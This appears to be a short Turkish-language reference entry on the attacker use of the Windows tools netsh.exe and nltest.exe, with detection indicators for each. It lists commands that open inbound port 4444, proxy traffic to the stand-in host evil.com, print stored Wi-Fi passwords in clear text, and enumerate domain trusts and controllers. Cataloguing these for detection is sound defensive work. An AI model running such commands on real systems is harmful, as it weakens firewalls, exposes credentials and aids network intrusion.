### netsh.exe

Ağ yapılandırması. Firewall bypass, port proxy, WiFi şifre çekme

**Komut:**
- netsh advfirewall firewall add rule name="Allow" dir=in action=allow protocol=tcp localport=4444
- netsh interface portproxy add v4tov4 listenport=8080 connectaddress=evil.com connectport=80
- netsh wlan show profile name="ProfileName" key=clear

**IOC:** portproxy argümanı, firewall rule ekleme, key=clear

---

### nltest.exe
Domain controller ve trust testi. Domain keşfi (discovery aşamasında sık)

**Komut:**
- nltest /domain_trusts
- nltest /dclist:domain

**IOC:** /domain_trusts veya /dclist argümanı, post-exploitation keşif zinciri